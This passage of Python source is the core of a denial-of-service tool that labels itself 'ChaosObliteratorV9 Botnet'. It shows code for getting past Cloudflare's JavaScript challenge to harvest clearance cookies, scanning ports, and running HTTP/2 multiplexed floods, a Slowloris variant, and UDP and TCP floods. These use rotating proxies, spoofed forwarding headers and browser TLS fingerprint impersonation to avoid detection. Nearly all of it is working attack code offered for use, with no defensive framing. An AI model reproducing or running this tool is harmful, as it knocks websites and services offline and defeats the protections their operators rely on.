                path = random.choice(self.retry_paths) if attempt > 0 else self._random_path()
                url = f"https://{self.target_l7}{path}"
                response = scraper.get(url, proxies={"https": proxy} if proxy else None, timeout=10)
                cookies = response.cookies.get_dict()
                cf_clearance = "cf_clearance" in cookies
                cf_bm = "__cf_bm" in cookies
                cf_chl = any(name.startswith("cf_chl") for name in cookies)
                if not (cf_clearance and cf_bm):
                    logging.error(f"Cloudscraper attempt {attempt + 1}: Missing cf_clearance or __cf_bm. Response: {response.text[:200]}")
                    self._save_cookies(cookies, response.headers)
                    attempt += 1
                    continue
                
                # Validate cookies with test request
                test_headers = self._random_headers()
                test_headers["Cookie"] = "; ".join([f"{name}={value}" for name, value in cookies.items()])
                try:
                    test_response = requests.get(f"https://{self.target_l7}", headers=test_headers, proxies={"https": proxy} if proxy else None, timeout=5)
                    if test_response.status_code != 200:
                        logging.error(f"Cloudscraper attempt {attempt + 1}: Cookie validation failed, status {test_response.status_code}. Response: {test_response.text[:200]}")
                        self._save_cookies(cookies, response.headers)
                        attempt += 1
                        continue
                except Exception as e:
                    logging.error(f"Cloudscraper attempt {attempt + 1}: Cookie validation request failed: {e}")
                    attempt += 1
                    continue
                
                # Check cookie expiry
                for name, value in cookies.items():
                    if name in ["cf_clearance", "__cf_bm"] and response.cookies[name].expires < time.time() + 60:
                        logging.error(f"Cloudscraper attempt {attempt + 1}: Cookie {name} expires too soon.")
                        self._save_cookies(cookies, response.headers)
                        attempt += 1
                        continue
                
                # Store cookies and headers
                for name, value in cookies.items():
                    self.cookies.set(name, value, domain=self.target_l7, path="/")
                self.session_headers = {
                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "document"
                }
                self._save_cookies(cookies, response.headers)
                logging.info("Cloudscraper: JS challenge passed, cookies obtained.")
                return
            except Exception as e:
                logging.error(f"Cloudscraper failed: {e}")
                attempt += 1
                if attempt == max_attempts:
                    logging.warning("Switching to HTTP/2 fallback...")
                    self._get_browser_session_h2()
        logging.error("Cloudscraper failed after max attempts.")

    def _get_browser_session_h2(self):
        """Fallback to HTTP/2 request."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_l7, 443))
            context = ssl._create_unverified_context()
            sock = context.wrap_socket(sock, server_hostname=self.target_l7)
            h2conn = h2.connection.H2Connection()
            h2conn.initiate_connection()
            sock.sendall(h2conn.data_to_send())
            headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": random.choice(self.retry_paths)}
            headers.update(self._random_headers())
            h2conn.send_headers(1, headers, end_stream=True)
            sock.sendall(h2conn.data_to_send())
            response = b""
            while True:
                data = sock.recv(65535)
                if not data:
                    break
                response += data
                events = h2conn.receive_data(data)
                for event in events:
                    if isinstance(event, h2.events.ResponseReceived):
                        logging.debug(f"HTTP/2 response headers: {event.headers}, body: {response[:200].decode('utf-8', errors='ignore')}")
                        cookies = [h for h in event.headers if h[0] == b"set-cookie"]
                        if cookies:
                            cookie_dict = {}
                            for cookie in cookies:
                                name, value = cookie[1].decode().split(";")[0].split("=")
                                cookie_dict[name] = value
                            cf_clearance = "cf_clearance" in cookie_dict
                            cf_bm = "__cf_bm" in cookie_dict
                            cf_chl = any(name.startswith("cf_chl") for name in cookie_dict)
                            if cf_clearance and cf_bm:
                                for name, value in cookie_dict.items():
                                    self.cookies.set(name, value, domain=self.target_l7, path="/")
                                self.session_headers = {
                                    "Cookie": "; ".join([f"{name}={value}" for name, value in self.cookies.items()]),
                                    "Sec-Fetch-Site": "same-origin",
                                    "Sec-Fetch-Mode": "navigate",
                                    "Sec-Fetch-Dest": "document"
                                }
                                self._save_cookies(cookie_dict, event.headers)
                                logging.info("HTTP/2: JS challenge passed, cookies obtained.")
                                sock.close()
                                return
            sock.close()
            logging.error("HTTP/2 failed: Missing cf_clearance or __cf_bm.")
        except Exception as e:
            logging.error(f"HTTP/2 failed: {e}")

    def _check_environment(self):
        """Check environment for dependencies."""
        try:
            import playwright
            try:
                version = subprocess.check_output(["playwright", "--version"]).decode().strip()
                logging.info(f"Playwright detected, version: {version}")
            except:
                logging.info("Playwright detected, version check failed.")
        except ImportError:
            logging.error("Playwright not installed. Run: pip3 install playwright")
            return False
        try:
            import tls_client
            try:
                logging.info(f"tls_client detected, version: {tls_client.__version__}")
            except:
                logging.info("tls_client detected, version check failed.")
        except ImportError:
            logging.error("tls_client not installed. Run: pip3 install tls-client")
            return False
        try:
            import selenium
            try:
                logging.info(f"Selenium detected, version: {selenium.__version__}")
            except:
                logging.info("Selenium detected, version check failed.")
        except ImportError:
            logging.warning("Selenium not installed. Run: pip3 install selenium")
        try:
            import undetected_chromedriver
            try:
                logging.info(f"undetected_chromedriver detected, version: {undetected_chromedriver.__version__}")
            except:
                logging.info("undetected_chromedriver detected, version check failed.")
        except ImportError:
            logging.warning("undetected_chromedriver not installed. Run: pip3 install undetected-chromedriver")
        try:
            os.system("playwright install chromium > /dev/null 2>&1")
            logging.info("Chromium installed for Playwright.")
        except:
            logging.warning("Failed to install Chromium, fallback may be used.")
        if os.system("command -v xvfb-run > /dev/null") != 0:
            logging.warning("Xvfb not detected, installing...")
            os.system("sudo apt update && sudo apt install -y xvfb > /dev/null 2>&1")
            if os.system("command -v xvfb-run > /dev/null") == 0:
                logging.info("Xvfb installed successfully.")
            else:
                logging.warning("Xvfb installation failed, may fail in non-GUI environments.")
        return True

    def _refresh_cookies(self):
        """Refresh cookies every 8 seconds."""
        while time.time() < self.end_time:
            try:
                self._get_browser_session()
            except Exception as e:
                logging.error(f"Cookie refresh failed: {e}")
            time.sleep(8)

    def _scan_ports(self):
        """Dynamic port scanning for L4 targets."""
        if not self.target_l4:
            return
        new_ports = []
        for port in [80, 443, 8080, 3389, 1433, 3306, 1723, 445, 1812, 5353, 3478, 6881, 17185, 27015, 4433]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.05)
                sock.connect((self.target_l4, port))
                new_ports.append(port)
                sock.close()
            except:
                pass
        if new_ports:
            with self.lock:
                self.active_ports = new_ports

    def _adjust_jitter(self, thread_id: int, response_time: float):
        """Per-thread adaptive jitter with Poisson distribution."""
        with self.lock:
            if response_time > 100:
                self.jitter_factors[thread_id] = min(self.jitter_factors[thread_id] * 1.15, 1.8)
            elif response_time < 50:
                self.jitter_factors[thread_id] = max(self.jitter_factors[thread_id] * 0.85, 0.6)
        return random.expovariate(1 / self.jitter_factors[thread_id])

    def _chaoshttp(self, thread_id: int):
        """L7: HTTP flood with tls_client and H2 multiplexing."""
        if not self.target_l7:
            return
        session = tls_client.Session(
            client_identifier=random.choice([f"chrome_{random.randint(124, 126)}", "firefox_126", "edge_125"]),
            random_tls_extension_order=True
        )
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                proto = random.random()
                if proto < 0.6:
                    headers = self._random_headers()
                    method = random.choice(["GET", "POST", "PUT"])
                    path = random.choice(self.retry_paths) if random.random() < 0.3 else self._random_path()
                    url = f"https://{self.target_l7}{path}"
                    body = self._random_payload(512) if method in ["POST", "PUT"] else None
                    if method == "GET":
                        resp = session.get(url, headers=headers, proxy=random.choice(self.proxy_pool), timeout=5)
                    else:
                        resp = session.post(url, headers=headers, data=body, proxy=random.choice(self.proxy_pool), timeout=5)
                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                    with self.lock:
                        self.success_count["chaoshttp"] += 1 if resp.status_code < 400 else 0
                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.015)
                    sock.connect((self.target_l7, 443))
                    context = ssl._create_unverified_context()
                    sock = context.wrap_socket(sock, server_hostname=self.target_l7)
                    h2conn = h2.connection.H2Connection()
                    h2conn.initiate_connection()
                    sock.sendall(h2conn.data_to_send())
                    headers = {":method": "GET", ":authority": self.target_l7, ":scheme": "https", ":path": random.choice(self.retry_paths)}
                    headers.update(self._random_headers())
                    for stream_id in range(1, 101, 2):
                        h2conn.send_headers(stream_id, headers, end_stream=True)
                        sock.sendall(h2conn.data_to_send())
                        time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
                    with self.lock:
                        self.success_count["chaoshttp"] += 1
                        self.response_times["chaoshttp"].append((time.time() - start_time) * 1000)
                    sock.close()
                time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
            except Exception as e:
                logging.debug(f"ChaosHTTP error: {e}")
            finally:
                logging.debug(f"ChaosHTTP thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")

    def _ghostloris(self, thread_id: int):
        """L7: Ghost Slowloris with tls_client."""
        if not self.target_l7:
            return
        try:
            session = tls_client.Session(
                client_identifier=random.choice([f"chrome_{random.randint(124, 126)}", "firefox_126", "edge_125"]),
                random_tls_extension_order=True
            )
            while time.time() < self.end_time:
                start_time = time.time()
                try:
                    headers = {
                        "User-Agent": random.choice(self.user_agents),
                        "X-Forwarded-For": self._random_ip(),
                        "Connection": "keep-alive"
                    }
                    headers.update(self.session_headers)
                    path = random.choice(self.retry_paths) if random.random() < 0.3 else self._random_path()
                    url = f"https://{self.target_l7}{path}"
                    session.get(url, headers=headers, timeout=0.08, proxy=random.choice(self.proxy_pool))
                    self._adjust_jitter(thread_id, (time.time() - start_time) * 1000)
                    with self.lock:
                        self.success_count["ghostloris"] += 1
                        self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
                    time.sleep(self._adjust_jitter(thread_id, (time.time() - start_time) * 1000))
                except Exception as e:
                    logging.debug(f"GhostLoris error: {e}")
                finally:
                    logging.debug(f"GhostLoris thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")
        except Exception as e:
            logging.error(f"GhostLoris thread {thread_id} failed to initialize: {e}")

    def _udpchaos(self, thread_id: int):
        """L4: UDP chaos with larger payloads."""
        if not self.target_l4:
            return
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                port = random.choice(self.active_ports)
                payload = self._random_payload(1024)
                sock.sendto(payload, (self.target_l4, port))
                with self.lock:
                    self.success_count["udpchaos"] += 1
                time.sleep(self._adjust_jitter(thread_id, 0))
            except:
                pass
            finally:
                logging.debug(f"UDPChaos thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")
        sock.close()

    def _tcpobliterator(self, thread_id: int):
        """L4: TCP obliterator with larger payloads."""
        if not self.target_l4:
            return
        while time.time() < self.end_time:
            start_time = time.time()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.015)
                port = random.choice(self.active_ports)
                sock.connect((self.target_l4, port))
                sock.send(self._random_payload(512))
                with self.lock:
                    self.success_count["tcpobliterator"] += 1
                sock.close()
                time.sleep(self._adjust_jitter(thread_id, 0))
            except:
                pass
            finally:
                logging.debug(f"TCPObliterator thread {thread_id} execution time: {(time.time() - start_time) * 1000:.2f} ms")

    def _save_state(self):
        """Save state before shutdown."""
        state = {
            "timestamp": time.time(),
            "success_count": self.success_count,
            "response_times": {k: sum(v)/len(v) if v else 0 for k, v in self.response_times.items()},
            "cookies": dict(self.cookies)
        }
        try:
            with open("chaos_obliterator_v9_state.json", "w") as f:
                json.dump(state, f, indent=2)
            logging.info("State saved to chaos_obliterator_v9_state.json")
        except Exception as e:
            logging.warning(f"Failed to save state: {e}")

    def start(self):
        """Unleash the chaos obliterator."""
        if not self.target_l7 and not self.target_l4:
            logging.error("At least one target (L7 or L4) required")
            return
        logging.info(f"ChaosObliteratorV9 strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}, proxy pool: {len(self.proxy_pool)} proxies")
        
        if not self._check_environment():
            logging.error("Environment check failed, exiting.")
            return
        
        if self.target_l7:
            threading.Thread(target=self._refresh_cookies, daemon=True).start()
            time.sleep(5)
        
        if self.target_l4:
            threading.Thread(target=self._scan_ports, daemon=True).start()
            time.sleep(0.3)
        
        threads = []
        method_funcs = {
            "chaoshttp": self._chaoshttp,
            "ghostloris": self._ghostloris,
            "udpchaos": self._udpchaos,
            "tcpobliterator": self._tcpobliterator
        }
        try:
            for method in self.methods:
                if method in method_funcs:
                    for i in range(self.threads // len(self.methods)):
                        t = threading.Thread(target=method_funcs[method], args=(i,), daemon=True)
                        threads.append(t)
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            logging.info("Received KeyboardInterrupt, shutting down gracefully...")
            self._save_state()
        finally:
            self._save_state()
            avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
            logging.info(f"Obliteration complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")

def main(target_l7: str, target_l4: str, duration: int, methods: str, proxy: str):
    methods = methods.split(",")
    obliterator = ChaosObliteratorV9(target_l7, target_l4, duration, methods=methods, proxy=proxy)
    obliterator.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ChaosObliteratorV9 Botnet")
    parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
    parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--methods", type=str, default="chaoshttp,ghostloris,udpchaos,tcpobliterator", help="Comma-separated methods")
    parser.add_argument("--proxy", type=str, default=None, help="Proxy (e.g., http://user:pass@host:port or socks5://host:port)")
    args = parser.parse_args()
    main(args.target_l7, args.target_l4, args.duration, args.methods, args.proxy)
